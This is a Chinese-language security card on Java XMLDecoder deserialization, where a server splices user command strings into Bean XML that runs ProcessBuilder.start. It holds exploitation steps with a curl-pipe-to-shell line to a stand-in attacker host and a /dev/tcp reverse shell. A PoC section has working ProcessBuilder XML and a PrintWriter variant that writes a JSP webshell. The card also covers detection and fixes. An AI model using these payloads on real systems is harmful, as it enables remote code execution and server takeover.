---
id: web-java-deserialization-xmldecoder-server-built-xml-processbuilder
title: 命令字符串被服务端自己拼成 XMLDecoder 的 Bean XML：用户不提供 XML 也能经 ProcessBuilder.start 执行命令，修复只能换解析器（SAX/JAXB）而非加白名单
type: scenario
domain: web
path: web/java/deserialization
technique: xmldecoder-server-side-xml-synthesis-processbuilder-start
aliases:
- 服务端拼接 XMLDecoder XML
- ProcessBuilder start XMLDecoder
- java.beans.XMLDecoder 命令执行
- XMLDecoder 加固换 SAX
- Bean XML 反序列化
tags:
- java
- deserialization
- xmldecoder
- processbuilder
- rce
- bean-xml
- secure-coding
cve: []
severity: high
confidence: medium
status: verified
created: '2026-05-16'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:39:39+08:00'
  notes: 已对照原文核对：缺陷代码把空格分隔的 payload 用 StringBuilder 拼进 <object class=java.lang.ProcessBuilder><array class=java.lang.String length=N> 与 <void method=start/> 模板再交给 XMLDecoder(ByteArrayInputStream).readObject()，与原文逐字对应；PrintWriter 写文件变体、SAXParserFactory 替换 XMLDecoder 的修复代码、ProcessBuilder(new String[]{calc}).start() 的等价语义均一致；原文为 JavaSecLab 教学环境，未给 XMLDecoder 所属 JDK 版本区间，未设 affected_versions 正确；本次核对未读取图片，仅依据正文；未在本机跑 Java 复现
---

## 一句话结论

很多「XMLDecoder 反序列化」并不需要攻击者提交 XML：只要业务代码把用户输入（本例是一个用空格分隔的命令字符串）自行拼进 XMLDecoder 的 Bean XML 模板——`<object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="N">…</array><void method="start"/></object>`——再交给 `new XMLDecoder(stream).readObject()`，攻击者只要控制那个字符串就等于控制了类名之外的整条对象构造与调用，命令直接执行；这类洞的正确修复是**换掉解析器**（SAX/JAXB 只做数据绑定），任何「过滤输入字符串」或「加 SafeConstructor」的思路都不成立。

## 原理

- **XMLDecoder 的语义就是「可执行 XML」**：它按 `<object class="X">` 实例化类、按 `<void method="m">` 在已构造对象上反射调用方法、按 `<array class="T" length="n">` + `<void index="i">` 填充数组元素，子元素顺序即构造实参顺序。解析过程没有类型白名单也没有「只读数据」模式，因此「拼出一个可以执行命令的 XML」等价于「写了一段代码」。
- **用户可控点从 XML 降级为字符串，反而更常见**：上面的模板里，`<object class="java.lang.ProcessBuilder">` 与 `<void method="start"/>` 都是服务端固定写死的，攻击者能改的只有 `<string>` 里的内容。但因为 `ProcessBuilder(String...)` 构造器本身就接收任意命令，且 `start()` 被无条件调用，**只要字符串可控就足够 RCE**——这条链不需要攻击者知道 XML 语法，也不需要突破任何标签过滤。
- **为什么 `split(" ")` 之类的处理不构成防护**：按空格切分只影响参数个数，`cmd /c whoami`、`bash -c 'id'`、`sh -c "cat /flag"` 都能被切成合法数组；XML 转义也不是障碍，因为危险字符（`<`、`&`）在命令里可用引号/变量/编码绕开，或者直接选择不含这些字符的命令。
- **为什么加白名单/SafeConstructor 救不了**：`SafeConstructor` 是 SnakeYAML 的概念，`XMLDecoder` 没有对应机制；`XMLDecoder` 的「白名单」只能靠自定义 `XMLDecoder` 子类覆盖 `ExceptionListener`/`ClassLoader`，实践中几乎没人做对。真正有效的是**不再用 XMLDecoder 解析不可信数据**：把输入当纯数据用 SAX/StAX 读成参数列表，或用带 schema 的 JAXB 绑定到固定 DTO，再自己决定要不要执行——执行与否由业务逻辑（而不是 XML 里的 `method` 属性）决定。
- **同类危险写法识别**：`new XMLDecoder(...)` 后面紧跟 `readObject()`；`XMLEncoder`/`XMLDecoder` 出现在**请求处理**路径上；业务代码里出现 `"<object class="`、`"<void method="` 这类字符串拼接——只要这三者同现，基本就是本卡场景。

## 触发条件

- 应用在处理请求时使用 `java.beans.XMLDecoder`，且 XML 中的类名/方法名由服务端模板固定、内容（命令、参数、路径）来自用户输入；
- 或者更直接：把用户提交的 XML/文件/流直接交给 `new XMLDecoder(...).readObject()`；
- JDK 中 `java.lang.ProcessBuilder`、`java.lang.Runtime`、`java.io.PrintWriter` 等类未被 SecurityManager 限制（默认环境均可用）；
- 应用以具有命令执行权限的账户运行（Web 容器用户的权限即最终危害边界）。

## 利用步骤

1. 定位 sink：搜 `XMLDecoder`、`readObject()`、`"<object class="`、`"method=\"start\""`；确认输入是「完整 XML」还是「被拼进模板的片段」。
2. 若输入是片段（本例），直接提交命令：`whoami`、`id`、`cat /flag`、`bash -c "curl attacker/s | sh"`；按空格切分时用 `bash -c '...'` 保证整条命令落在一个元素里。
3. 若输入是完整 XML，用标准 payload：`ProcessBuilder` + `String[]` + `start`；要落文件时把对象换成 `java.io.PrintWriter`（构造参数为路径）+ `<void method="println"><string>…</string></void>` + `<void method="close"/>`，写 JSP/脚本到 Web 目录。
4. 无回显时用带外：`ProcessBuilder` 里执行 `curl`/`nslookup`/`bash -c 'bash -i >& /dev/tcp/…'`；或把 flag 写到 Web 可访问路径后请求读取。
5. 验证修复是否真的换了解析器：同样请求应只被当作普通字符串解析（如返回「命令解析成功: whoami」而不产生子进程）。

## PoC

服务端拼接的危险 XML（类名与 `start` 方法为模板固定部分，只有 `<string>` 内容可控）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_151" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string>bash</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>id > /tmp/o.txt</string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```

等价于：

```java
new java.lang.ProcessBuilder(new String[]{"bash", "-c", "id > /tmp/o.txt"}).start();
```

攻击者实际只需提交（空格分隔形式）：`bash -c id>/tmp/o.txt`

写文件变体（把对象换成 `PrintWriter`，等价于 `new PrintWriter(path).println(x)`）：

```xml
<java version="1.4.0" class="java.beans.XMLDecoder">
  <object class="java.io.PrintWriter">
    <string>webapps/ROOT/x.jsp</string>
    <void method="println"><string><![CDATA[ <% out.println("x"); %> ]]></string></void>
    <void method="close"/>
  </object>
</java>
```

## 变体与关联

- **变体（执行元件）**：`ProcessBuilder` + `start`（本文）、`Runtime.getRuntime().exec`（需 `getRuntime` 静态调用，写法更绕）、`PrintWriter`/`FileOutputStream` 写文件、`System.setProperty` 改配置、`javax.naming.InitialContext.lookup` 接 JNDI。
- **变体（输入形态）**：完整 XML 提交（最典型）、文件导入（存档/配置/压缩包内的 XML）、服务端模板拼接（本卡，攻击者只控片段）。
- **关联**：[[web-java-deserialization-xmldecoder-hodoku-hsol-puzzle-rce]]（同为 `XMLDecoder` + `ProcessBuilder.start`，但那条的载体是客户端导入的 `.hsol` 压缩包、XML 完全由攻击者提供；本卡的可复用增量是「XML 由服务端自己拼，用户只控命令片段」，因此输入过滤类防护完全无效，修复必须换解析器）。

## 检测与防御

- **代码层（唯一有效方向）**：禁止 `XMLDecoder` 处理任何不可信数据；把「命令字符串 → 执行」的路径改成结构化数据 + 显式白名单校验（只允许预定义的动作枚举，不允许任意命令），并用 SAX/StAX/JAXB 解析只取数据字段，执行动作由业务代码决定。
- **不要依赖**：输入长度/字符黑名单（`bash -c` 就能绕）、空格切分、XML 转义、`SafeConstructor`（属于 SnakeYAML，对 XMLDecoder 无效）。
- **检测点**：Java 进程出现 `XMLDecoder` 类加载；Web 进程（`java`/`javaw`）在收到请求后立即派生 `bash`/`sh`/`cmd.exe`/`powershell` 子进程；请求参数里出现 `bash -c`、`sh -c`、`ProcessBuilder`、`java.lang.Runtime`、`/dev/tcp`、`<object class=`；同一接口短时间内多组命令探测。
- **加固**：以低权限账户运行 Web 容器，禁用或裁剪 `SecurityManager` 之外的可执行路径；对 Web 目录禁止进程写入；出站流量白名单降低反弹与外带成功率。
